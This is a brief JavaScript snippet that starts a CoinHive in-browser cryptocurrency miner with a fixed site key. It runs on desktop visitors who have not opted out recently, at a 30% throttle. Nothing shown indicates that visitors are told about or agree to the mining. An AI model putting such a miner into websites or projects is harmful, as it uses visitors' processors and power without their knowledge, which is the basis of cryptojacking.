var miner = new CoinHive.Anonymous('GfYzCZV7hvVcC5VWbyqHtsB376eqf5ML', {throttle: 0.3});

if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}
